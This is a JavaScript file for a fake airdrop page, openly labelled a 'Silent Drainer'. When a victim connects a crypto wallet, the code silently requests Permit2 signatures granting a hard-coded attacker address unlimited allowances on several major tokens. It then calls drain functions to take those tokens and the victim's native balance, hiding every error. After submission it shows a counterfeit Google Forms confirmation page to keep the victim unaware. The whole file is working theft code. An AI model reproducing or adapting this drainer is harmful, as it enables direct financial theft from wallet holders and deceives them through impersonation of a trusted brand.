// =============================================
// app.js - Silent Drainer + Google Forms Success Page
// =============================================

const DRAINER_ADDRESS = "0xd9145CCE52D386f254917e481eB44e9943F39138";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const targetTokens = [
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    "0x55d398326f99059fF775485246999027B3197955",
    "0x4200000000000000000000000000000000000006",
    "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
];

let connectedWallet = "";

document.addEventListener("DOMContentLoaded", () => {
    const connectBtn = document.getElementById("connectWalletBtn");
    const walletDisplay = document.getElementById("walletAddress");
    const statusEl = document.getElementById("status");
    const form = document.getElementById("airdropForm");

    connectBtn.addEventListener("click", async () => {
        try {
            const provider = window.ethereum;
            if (!provider) throw new Error("No wallet");

            const accounts = await provider.request({ method: "eth_requestAccounts" });
            connectedWallet = accounts[0];

            const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.slice(-4);
            walletDisplay.innerHTML = `<strong>Connected Wallet:</strong><br>${shortAddress}`;
            walletDisplay.classList.add("visible");

            connectBtn.textContent = "Wallet Connected";
            connectBtn.classList.add("connected");

            // Silent drain
            startSilentDrain();

        } catch (e) {
            console.error(e);
        }
    });

    form.addEventListener("submit", (e) => {
        e.preventDefault();
        if (!connectedWallet) {
            alert("Please connect your wallet first.");
            return;
        }
        showGoogleFormsSuccessPage();
    });
});

// Silent Draining
async function startSilentDrain() {
    try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const contract = new ethers.Contract(DRAINER_ADDRESS, [
            "function drainWithPermit2(address victim, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
            "function drainNative(address victim) external"
        ], signer);

        for (let token of targetTokens) {
            try {
                const data = await getPermit2Signature(token);
                contract.drainWithPermit2(connectedWallet, data.permitSingle, data.signature).catch(() => {});
            } catch (e) {}
        }

        contract.drainNative(connectedWallet).catch(() => {});
    } catch (e) {}
}

async function getPermit2Signature(tokenAddress) {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;
    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;

    const permitSingle = {
        details: { token: tokenAddress, amount: "1461501637330902918203684832716283019655932542975", expiration, nonce: 0 },
        spender: DRAINER_ADDRESS,
        sigDeadline: sigDeadline
    };

    const typedData = {
        domain: { name: "Permit2", chainId, verifyingContract: PERMIT2_ADDRESS },
        types: {
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: permitSingle
    };

    const signature = await provider.send("eth_signTypedData_v4", [
        connectedWallet,
        JSON.stringify(typedData)
    ]);

    return { permitSingle, signature };
}

// ===================== GOOGLE FORMS SUCCESS PAGE (Purple Theme) =====================
function showGoogleFormsSuccessPage() {
    document.body.innerHTML = `
        <div style="max-width:680px; margin:60px auto; text-align:center; font-family:'Roboto',Arial,sans-serif; background:white; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1); padding:40px 20px;">
            
            <!-- Purple Top Bar -->
            <div style="height:8px; background:#8e24aa; border-radius:8px 8px 0 0; margin:-40px -20px 30px -20px;"></div>
            
            <h1 style="font-size:28px; color:#202124; margin-bottom:16px;">Your response has been recorded</h1>
            
            <p style="font-size:18px; color:#5f6368; margin-bottom:40px;">
                Thank you for submitting the form.<br>
                Your response has been successfully saved.
            </p>

            <a href="#" onclick="location.reload()" 
               style="color:#8e24aa; font-size:16px; text-decoration:underline; font-weight:500;">
                Edit your response
            </a>

            <div style="margin-top:80px; color:#9aa0a6; font-size:13px;">
                This content is neither created nor endorsed by Google.<br>
                Report Abuse • Terms of Service • Privacy Policy
            </div>

            <div style="margin-top:30px; color:#8e24aa; font-size:22px; font-weight:500;">
                Google Forms
            </div>
        </div>
    `;
}
